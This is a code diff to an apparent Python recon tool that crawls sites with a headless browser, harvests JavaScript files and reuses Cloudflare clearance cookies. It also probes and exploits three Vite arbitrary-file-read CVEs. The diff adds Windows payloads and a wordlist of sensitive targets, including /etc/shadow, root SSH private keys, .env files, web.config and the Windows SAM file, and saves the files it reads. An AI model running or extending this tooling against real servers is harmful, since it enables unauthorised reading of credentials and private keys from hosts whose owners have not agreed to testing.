@@ -141,13 +141,20 @@ def is_obvious_js(url: str) -> bool:
 # ─── Stage 1: Playwright JS collection ───────────────────────────────────────
 # Runs in a separate process via ProcessPoolExecutor to prevent event loop blocking
 
-def _playwright_worker(url: str, timeout: int, custom_headers: dict | None) -> tuple[list[str], str | None]:
+def _playwright_worker(
+    url: str,
+    timeout: int,
+    custom_headers: dict | None,
+    crawl_mode: str = "none",
+    crawl_depth: int = 10,
+) -> tuple[list[str], str | None, dict, bool]:
     """
     Sync Playwright worker — runs in a subprocess.
-    Returns (js_urls, build_id).
+    Returns (js_urls, build_id, cookies, is_cloudflare).
     """
     import asyncio
     from playwright.sync_api import sync_playwright
+    from urllib.parse import urlparse as _urlparse
 
     js_urls: list[str] = []
     page_build_id: str | None = None
@@ -170,9 +177,16 @@ def _playwright_worker(url: str, timeout: int, custom_headers: dict | None) -> t
             page = ctx.new_page()
 
             def on_request(req):
+                u = req.url
+                if u.startswith("blob:") or u in js_urls:
+                    return
+                # Catch scripts loaded via any mechanism
                 if req.resource_type == "script":
-                    u = req.url
-                    if not u.startswith("blob:") and u not in js_urls:
+                    js_urls.append(u)
+                elif req.resource_type in ("fetch", "xhr", "other"):
+                    # Dynamic imports and fetch-loaded JS
+                    path = u.split("?")[0].split("#")[0]
+                    if path.endswith(".js") or path.endswith(".mjs") or path.endswith(".cjs"):
                         js_urls.append(u)
 
             page.on("request", on_request)
@@ -221,11 +235,167 @@ def _playwright_worker(url: str, timeout: int, custom_headers: dict | None) -> t
             except Exception:
                 pass
 
+            def _collect_html_scripts():
+                try:
+                    scripts = page.evaluate("""
+                        () => Array.from(document.querySelectorAll('script[src]'))
+                                   .map(s => s.src)
+                                   .filter(s => s && !s.startsWith('blob:'))
+                    """)
+                    for s in (scripts or []):
+                        if s not in js_urls:
+                            js_urls.append(s)
+                except Exception:
+                    pass
+
+            def _crawl_medium():
+                try:
+                    try:
+                        page.evaluate("""
+                            () => new Promise(resolve => {
+                                let total = 0;
+                                const limit = Math.min(document.body.scrollHeight, 5000);
+                                const step = () => {
+                                    window.scrollBy(0, 300);
+                                    total += 300;
+                                    if (total < limit) setTimeout(step, 80);
+                                    else resolve();
+                                };
+                                step();
+                            })
+                        """, timeout=5000)
+                    except Exception:
+                        pass
+                    page.wait_for_timeout(500)
+                    _collect_html_scripts()
+                    for sel in ["[role=tab]","[role=menuitem]","nav a",".nav-link",
+                                "button:not([type=submit]):not([disabled])",
+                                "[data-toggle]","[data-bs-toggle]",".accordion-button"]:
+                        try:
+                            for el in page.query_selector_all(sel)[:5]:
+                                try:
+                                    el.scroll_into_view_if_needed()
+                                    el.click(timeout=1000, force=True)
+                                    page.wait_for_timeout(500)
+                                    _collect_html_scripts()
+                                except Exception:
+                                    pass
+                        except Exception:
+                            pass
+                    for el in (page.query_selector_all("nav li, .dropdown, [data-hover]") or [])[:10]:
+                        try:
+                            el.hover(timeout=500)
+                            page.wait_for_timeout(300)
+                            _collect_html_scripts()
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+
+            def _crawl_deep():
+                _crawl_medium()
+                origin = _urlparse(url)
+                base_origin = f"{origin.scheme}://{origin.netloc}"
+                visited = {url}
+
+                # Collect links from main page only
+                try:
+                    links = page.evaluate("""
+                        (base) => {
+                            const seen = new Set();
+                            return Array.from(document.querySelectorAll('a[href]'))
+                                .map(a => a.href.split('?')[0].split('#')[0])
+                                .filter(h => h.startsWith(base) && h !== base + '/' && !seen.has(h) && seen.add(h))
+                        }
+                    """, base_origin)
+                    # Deduplicate and limit queue
+                    queue = []
+                    for l in (links or []):
+                        if l not in visited and l not in queue:
+                            queue.append(l)
+                        if len(queue) >= crawl_depth:
+                            break
+                except Exception:
+                    queue = []
+
+                print(f"[crawl:deep] found {len(links or [])} link(s), queued {len(queue)}")
+                for l in queue[:5]:
+                    print(f"[crawl:deep]   → {l}")
+
+                for i, link in enumerate(queue):
+                    visited.add(link)
+                    before = len(js_urls)
+                    try:
+                        resp = page.goto(link, timeout=8000, wait_until="domcontentloaded")
+                        if resp and resp.status < 400:
+                            page.wait_for_timeout(500)
+                            _collect_html_scripts()
+                            new_js = len(js_urls) - before
+                            print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → +{new_js} JS")
+                        else:
+                            status = resp.status if resp else "err"
+                            print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → skip ({status})")
+                    except Exception:
+                        print(f"[crawl:deep] [{i+1}/{len(queue)}] {link} → error")
+
+            if crawl_mode == "medium":
+                print(f"[crawl:medium] starting interaction crawl...")
+                _crawl_medium()
+                print(f"[crawl:medium] done, {len(js_urls)} JS total")
+            elif crawl_mode == "deep":
+                print(f"[crawl:deep] starting deep crawl (depth={crawl_depth})...")
+                _crawl_deep()
+                print(f"[crawl:deep] done, {len(js_urls)} JS total")
+
+            # ── Cloudflare detection ──────────────────────────────
+            is_cloudflare = False
+            try:
+                cf_headers = page.evaluate("""
+                    () => {
+                        const metas = document.querySelectorAll('meta[name]');
+                        const title = document.title || '';
+                        const body = document.body ? document.body.innerText.slice(0, 500) : '';
+                        return {title, body};
+                    }
+                """)
+                title = cf_headers.get('title', '').lower()
+                body = cf_headers.get('body', '').lower()
+                if any(x in title for x in ['just a moment', 'cloudflare', 'attention required']):
+                    is_cloudflare = True
+                elif 'checking your browser' in body or 'cf-browser-verification' in body:
+                    is_cloudflare = True
+            except Exception:
+                pass
+
+            # Check response headers via network interception result
+            if not is_cloudflare:
+                try:
+                    resp = page.evaluate("""
+                        () => {
+                            const cookies = document.cookie;
+                            return cookies.includes('cf_clearance') || cookies.includes('__cf_bm');
+                        }
+                    """)
+                    # If cf_clearance exists, we passed CF — not blocked
+                except Exception:
+                    pass
+
+            # ── Extract cookies for httpx reuse ───────────────────────
+            session_cookies: dict = {}
+            try:
+                raw_cookies = ctx.cookies()
+                session_cookies = {c['name']: c['value'] for c in raw_cookies}
+                # Flag as cloudflare if cf cookies present
+                if 'cf_clearance' in session_cookies or '__cf_bm' in session_cookies:
+                    is_cloudflare = True
+            except Exception:
+                pass
+
             browser.close()
     except Exception:
         pass
 
-    return js_urls, page_build_id
+    return js_urls, page_build_id, session_cookies, is_cloudflare
 
 
 async def collect_js_playwright(
@@ -233,21 +403,27 @@ async def collect_js_playwright(
     timeout: int = 20,
     custom_headers: dict | None = None,
     executor=None,
+    crawl_mode: str = "none",
+    crawl_depth: int = 10,
 ) -> tuple[list[str], str | None]:
     """
     Async wrapper — runs _playwright_worker in a separate process.
     Hard kill via executor timeout prevents event loop blocking.
     """
     loop = asyncio.get_running_loop()
-    hard_timeout = timeout + 10  # OS-level kill if process hangs
+    extra = {"none": 10, "medium": 30, "deep": 60}.get(crawl_mode, 10)
+    hard_timeout = timeout + extra
     try:
         result = await asyncio.wait_for(
-            loop.run_in_executor(executor, _playwright_worker, url, timeout, custom_headers),
+            loop.run_in_executor(
+                executor, _playwright_worker,
+                url, timeout, custom_headers, crawl_mode, crawl_depth
+            ),
             timeout=hard_timeout,
         )
         return result
     except (asyncio.TimeoutError, Exception):
-        return [], None
+        return [], None, {}, False
 
 
 # ─── Stage 2: Brute-force sibling JS files ───────────────────────────────────
@@ -625,6 +801,8 @@ async def process_subdomain(
     brute_concurrency: int = 20,
     brute_delay: float = 0.0,
     pw_executor=None,
+    crawl_mode: str = "none",
+    crawl_depth: int = 10,
 ):
     url = normalize(raw)
     if not url:
@@ -637,13 +815,18 @@ async def process_subdomain(
 
         # Stage 1 — collect JS via headless browser
         try:
-            js_urls, page_build_id = await collect_js_playwright(
+            js_urls, page_build_id, pw_cookies, is_cloudflare = await collect_js_playwright(
                 url, timeout=timeout, custom_headers=custom_headers,
                 executor=pw_executor,
+                crawl_mode=crawl_mode,
+                crawl_depth=crawl_depth,
             )
         except Exception as e:
             print(f"{_pfx()}{_c(_C_RED, "[!]")} Playwright error: {e}", file=sys.stderr)
-            js_urls, page_build_id = [], None
+            js_urls, page_build_id, pw_cookies, is_cloudflare = [], None, {}, False
+
+        if is_cloudflare:
+            print(f"{_pfx()}{_c(_C_YELLOW, "[cf]")} Cloudflare detected — brute disabled, using browser cookies for downloads")
 
         if verbose:
             for u in js_urls:
@@ -669,7 +852,7 @@ async def process_subdomain(
         base_dirs = list({base_dir_of(u) for u in target_js})
 
         bruted: list[str] = []
-        if base_dirs:
+        if base_dirs and not is_cloudflare:
             _info(f"Bruting {len(wordlist)} names in {len(base_dirs)} dir(s)…")
             bruted = await brute_js_names(base_dirs, wordlist,
                                               concurrency=brute_concurrency,
@@ -682,6 +865,8 @@ async def process_subdomain(
                 for u in bruted:
                     print(f"  [brute] {u}")
             _ok(f"Brute found {_c(_C_YELLOW if bruted else _C_DIM, str(len(bruted)))} new JS file(s)")
+        elif is_cloudflare and base_dirs:
+            print(f"{_pfx()}{_c(_C_DIM, "[-] Brute skipped (Cloudflare)")}")
 
         # Save — only target-domain JS in js_files.txt
         js_f, br_f = save_results(output_dir, slug, target_js, bruted)
@@ -691,12 +876,23 @@ async def process_subdomain(
         # Download if requested
         if download:
             all_js = list(set(target_js + bruted))
-            await download_js_files(all_js, output_dir / slug, custom_headers=custom_headers)
+            # Merge Playwright cookies into headers for Cloudflare-protected sites
+            dl_headers = dict(custom_headers or {})
+            if pw_cookies:
+                existing_cookie = dl_headers.get("Cookie", "")
+                new_cookies = "; ".join(f"{k}={v}" for k, v in pw_cookies.items())
+                dl_headers["Cookie"] = (existing_cookie + "; " + new_cookies).strip("; ") if existing_cookie else new_cookies
+            await download_js_files(all_js, output_dir / slug, custom_headers=dl_headers)
 
         # Next.js: buildId + routes + data endpoints
         req_headers = {"User-Agent": UA}
         if custom_headers:
             req_headers.update(custom_headers)
+        # Inject Playwright cookies so httpx can reach CF-protected endpoints
+        if pw_cookies:
+            existing_cookie = req_headers.get("Cookie", "")
+            new_cookies = "; ".join(f"{k}={v}" for k, v in pw_cookies.items())
+            req_headers["Cookie"] = (existing_cookie + "; " + new_cookies).strip("; ") if existing_cookie else new_cookies
         async with httpx.AsyncClient(verify=False, headers=req_headers) as client:
             try:
                 async with asyncio.timeout(120):
@@ -718,7 +914,8 @@ async def process_subdomain(
 
 # ─── Vite CVE detection ───────────────────────────────────────────────────────
 
-VITE_LFI_WORDLIST = [
+# Linux paths
+VITE_LFI_WORDLIST_LINUX = [
     "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
     "/etc/ssh/sshd_config", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
     "/root/.bash_history", "/root/.bashrc", "/root/.profile",
@@ -730,6 +927,27 @@ VITE_LFI_WORDLIST = [
     "/var/log/apache2/access.log", "/var/log/nginx/access.log",
     "/var/log/auth.log",
 ]
+
+# Windows paths — used when Windows server detected
+VITE_LFI_WORDLIST_WINDOWS = [
+    "/C:/windows/win.ini",
+    "/C:/windows/system32/drivers/etc/hosts",
+    "/C:/inetpub/wwwroot/.env",
+    "/C:/inetpub/wwwroot/web.config",
+    "/C:/inetpub/wwwroot/.env.local",
+    "/C:/inetpub/wwwroot/.env.production",
+    "/C:/inetpub/wwwroot/vite.config.ts",
+    "/C:/inetpub/wwwroot/vite.config.js",
+    "/C:/inetpub/wwwroot/package.json",
+    "/C:/Users/Administrator/.ssh/id_rsa",
+    "/C:/boot.ini",
+    "/C:/windows/repair/sam",
+    "/C:/windows/php.ini",
+    "/C:/ProgramData/MySQL/MySQL Server 8.0/my.ini",
+]
+
+# Combined — Linux first, Windows appended
+VITE_LFI_WORDLIST = VITE_LFI_WORDLIST_LINUX
 
 
 def get_vite_root_path(js_urls):
@@ -750,16 +968,28 @@ async def probe_cve(client, base_url, root_path):
 
     probes = {
         "CVE-2025-30208": [
+            # Linux
             f"{base}{root}/etc/passwd?import&raw??",
             f"{base}{root}/@fs/etc/passwd?import&raw??",
+            # Windows
+            f"{base}{root}/C://windows/win.ini?import&raw??",
+            f"{base}{root}/@fs/C://windows/win.ini?import&raw??",
         ],
         "CVE-2025-31125": [
+            # Linux
             f"{base}{root}/etc/passwd?import&?inline=1.wasm?init",
             f"{base}{root}/@fs/etc/passwd?import&?inline=1.wasm?init",
+            # Windows
+            f"{base}{root}/C://windows/win.ini?import&?inline=1.wasm?init",
+            f"{base}{root}/@fs/C://windows/win.ini?import&?inline=1.wasm?init",
         ],
         "CVE-2025-31486": [
+            # Linux
             f"{base}{root}/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
             f"{base}{root}/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
+            # Windows
+            f"{base}{root}/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&raw??",
+            f"{base}{root}/@fs/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&raw??",
         ],
     }
 
@@ -773,17 +1003,39 @@ async def probe_cve(client, base_url, root_path):
         "CVE-2025-31486": is_success_31486,
     }
 
+    RESPONSE_MARKERS = {
+        "CVE-2025-30208": "export default",
+        "CVE-2025-31125": "data:application/octet-stream;base64",
+        "CVE-2025-31486": "export default",
+    }
+
+    SEP_FROM_URL = {
+        0: "",      # Linux, no /@fs
+        1: "/@fs",  # Linux, with /@fs
+        2: "",      # Windows, no /@fs
+        3: "/@fs",  # Windows, with /@fs
+    }
+    IS_WINDOWS = {0: False, 1: False, 2: True, 3: True}
+
     for cve, urls in probes.items():
-        confirmed = False
-        for probe_url in urls:
+        results[cve] = {"confirmed": False}
+        for idx, probe_url in enumerate(urls):
             try:
                 r = await client.get(probe_url, timeout=_T_FAST, follow_redirects=True)
                 if r.status_code == 200 and markers[cve](r):
-                    confirmed = True
+                    sep = SEP_FROM_URL.get(idx, "")
+                    is_win = IS_WINDOWS.get(idx, False)
+                    results[cve] = {
+                        "confirmed":       True,
+                        "payload":         probe_url,
+                        "sep":             sep,
+                        "is_windows":      is_win,
+                        "response_marker": RESPONSE_MARKERS[cve],
+                        "root_path":       root_path,
+                    }
                     break
             except Exception:
                 continue
-        results[cve] = confirmed
 
     return results
 
@@ -824,13 +1076,14 @@ def is_lfi_success(cve, r):
     return False
 
 
-async def exploit_vite_lfi(client, base_url, root_path, cve, domain_dir):
+async def exploit_vite_lfi(client, base_url, root_path, cve, domain_dir, is_windows: bool = False):
     base = base_url.rstrip("/")
     root = root_path.rstrip("/")
     lfi_dir = domain_dir / "vite_lfi"
     lfi_dir.mkdir(exist_ok=True)
     found = []
     sem = asyncio.Semaphore(5)
+    wordlist = VITE_LFI_WORDLIST_WINDOWS if is_windows else VITE_LFI_WORDLIST_LINUX
 
     async def probe(sensitive_path):
         async with sem:
@@ -848,7 +1101,7 @@ async def exploit_vite_lfi(client, base_url, root_path, cve, domain_dir):
                 except Exception:
                     continue
 
-    await asyncio.gather(*[probe(p) for p in VITE_LFI_WORDLIST])
+    await asyncio.gather(*[probe(p) for p in wordlist])
     return found
 
 
@@ -860,23 +1113,33 @@ async def process_vite(base_url, js_urls, domain_dir, client):
     print(f"{_pfx()}{_c(_C_CYAN + _C_BOLD, '[vite]')} Detected — root: {_c(_C_YELLOW, root_path)}")
 
     cve_results = await probe_cve(client, base_url, root_path)
-    confirmed = [cve for cve, ok in cve_results.items() if ok]
+    confirmed = [cve for cve, info in cve_results.items() if info.get("confirmed")]
 
     if not confirmed:
         print(f"{_pfx()}{_c(_C_DIM, '[-] No Vite CVEs confirmed')}")
-        vite_info = {"root_path": root_path, "base_url": base_url, "cve_probed": cve_results, "confirmed": [], "lfi_files": []}
+        vite_info = {
+            "root_path": root_path,
+            "base_url":  base_url,
+            "confirmed": {},
+            "lfi_files": [],
+        }
         (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")
         return
 
     for cve in confirmed:
-        print(f"{_pfx()}{_c(_C_RED + _C_BOLD, '[CVE]')} {_c(_C_RED, cve)} CONFIRMED")
+        info = cve_results[cve]
+        os_tag = "Windows" if info.get("is_windows") else "Linux"
+        print(f"{_pfx()}{_c(_C_RED + _C_BOLD, '[CVE]')} {_c(_C_RED, cve)} CONFIRMED ({os_tag})")
+        print(f"{_pfx()}    payload: {_c(_C_DIM, info['payload'])}")
+        print(f"{_pfx()}    sep:     {_c(_C_DIM, info['sep'] or 'none')}")
 
     best_cve = confirmed[0]
     print(f"{_pfx()}{_c(_C_YELLOW, f'[lfi] Exploiting {best_cve} — trying {len(VITE_LFI_WORDLIST)} paths...')}")
 
     try:
         async with asyncio.timeout(60):
-            found = await exploit_vite_lfi(client, base_url, root_path, best_cve, domain_dir)
+            is_win = cve_results[best_cve].get("is_windows", False)
+            found = await exploit_vite_lfi(client, base_url, root_path, best_cve, domain_dir, is_windows=is_win)
     except asyncio.TimeoutError:
         found = []
         print(f"{_pfx()}{_c(_C_YELLOW, '[lfi] timeout')}")
@@ -884,9 +1147,17 @@ async def process_vite(base_url, js_urls, domain_dir, client):
     if found:
         _ok(f"LFI: {_c(_C_RED, str(len(found)))} file(s) read -> {_c(_C_DIM, str(domain_dir / 'vite_lfi'))}")
 
+    # Build confirmed dict with full details
+    confirmed_details = {
+        cve: cve_results[cve]
+        for cve in confirmed
+    }
+
     vite_info = {
-        "root_path": root_path, "base_url": base_url,
-        "cve_probed": cve_results, "confirmed": confirmed, "lfi_files": found,
+        "root_path":  root_path,
+        "base_url":   base_url,
+        "confirmed":  confirmed_details,
+        "lfi_files":  found,
     }
     (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")
 
@@ -1124,6 +1395,7 @@ async def main():
     )
     parser.add_argument("-f", "--file", default=None, help="File with subdomains (one per line)")
     parser.add_argument("-u", "--url", default=None, help="Single subdomain/domain to scan")
+    parser.add_argument("target", nargs="?", help="Single subdomain/domain to scan (positional, same as -u/--url)")
     parser.add_argument("-w", "--wordlist", default=None, help="Custom JS wordlist (one name per line, no extension)")
     parser.add_argument("-t", "--timeout", type=int, default=20, help="Page load timeout in seconds (default: 20)")
     parser.add_argument("-c", "--concurrency", type=int, default=3, help="Max parallel subdomains (default: 3)")
@@ -1138,9 +1410,15 @@ async def main():
                         help="Parallel brute requests per directory (default: 20, use 3-5 for Tor)")
     parser.add_argument("--brute-delay", type=float, default=0.0,
                         help="Delay in seconds between brute requests (default: 0, use 1-2 for Tor)")
+    parser.add_argument("--crawl", choices=["none", "medium", "deep"], default="none",
+                        help="Crawl mode: none=single page; medium=interact+scroll; deep=follow internal links")
+    parser.add_argument("--crawl-depth", type=int, default=10,
+                        help="Max pages to visit in deep crawl mode (default: 10)")
     args = parser.parse_args()
 
     # Load target(s)
+    if not args.file and not args.url and args.target:
+        args.url = args.target
     if args.file:
         subdomains_path = Path(args.file)
         if not subdomains_path.exists():
@@ -1178,6 +1456,8 @@ async def main():
             brute_concurrency=args.brute_concurrency,
             brute_delay=args.brute_delay,
             pw_executor=pw_executor,
+            crawl_mode=args.crawl,
+            crawl_depth=args.crawl_depth,
         )
         for sub in subdomains
     ]
